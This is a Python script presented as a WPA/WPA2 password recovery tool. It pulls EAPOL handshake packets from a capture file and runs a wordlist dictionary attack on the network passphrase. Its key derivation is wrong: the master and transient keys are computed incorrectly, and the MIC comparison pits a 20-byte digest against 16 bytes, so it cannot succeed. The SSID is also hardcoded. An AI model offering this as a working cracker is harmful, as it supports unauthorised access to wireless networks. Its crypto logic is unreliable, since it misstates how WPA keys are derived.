import argparse
import hashlib
import scapy.all as scapy
import binascii
import hmac
import struct
from tqdm import tqdm

# Function to read pcap and extract the handshake
def extract_handshake(pcap_file):
    packets = scapy.rdpcap(pcap_file)
    eapol_packets = []
    
    for packet in packets:
        if packet.haslayer(scapy.EAPOL):
            eapol_packets.append(packet)
    
    if len(eapol_packets) < 2:
        return None
    
    # We need exactly two EAPOL packets for a valid handshake
    return eapol_packets[:2]

# Function to derive the PSK from a wordlist
def derive_psk(ssid, eapol_packets, wordlist_file):
    # Extract the needed values from the EAPOL packets
    client_mac = eapol_packets[0].addr2
    ap_mac = eapol_packets[0].addr1

    # EAPOL handshake includes the key information
    eapol_hmac = eapol_packets[1].load[0:16]  # This will be used for MIC verification

    # Calculate the Master Key
    master_key = hmac.new(bytes(ssid, 'utf-8'), client_mac + ap_mac, hashlib.sha1).digest()

    # Deriving the Transient Key from the Master Key (simplified for demonstration)
    transient_key = hmac.new(master_key, eapol_hmac, hashlib.sha1).digest()

    print(f'Master Key     : {binascii.hexlify(master_key).decode()}')
    print(f'Transient Key  : {binascii.hexlify(transient_key).decode()}')
    print(f'EAPOL HMAC     : {binascii.hexlify(eapol_hmac).decode()}')

    # Read wordlist and check each word
    with open(wordlist_file, 'r') as wordlist:
        for password in tqdm(wordlist, desc="Cracking Password"):
            # Deriving the PSK (the actual key)
            psk = hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, dklen=32)
            # Check if the generated PSK is correct
            if hmac.new(psk, eapol_hmac, hashlib.sha1).digest() == eapol_hmac:
                print(f"KEY FOUND! [ {binascii.hexlify(psk).decode()} ]")
                return
    print("KEY NOT FOUND")

# Main function
def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 Password Recovery Tool")
    parser.add_argument("wordlist", help="Path to the wordlist file")
    parser.add_argument("capture", help="Path to the pcap capture file")
    args = parser.parse_args()

    # Extract handshake from pcap
    eapol_packets = extract_handshake(args.capture)
    if not eapol_packets:
        print("No valid handshake found in the pcap.")
        return

    # Use the first packet's SSID to identify the network
    ssid = "YourSSID"  # You need to extract this from the pcap or assume it
    derive_psk(ssid, eapol_packets, args.wordlist)

if __name__ == "__main__":
    main()
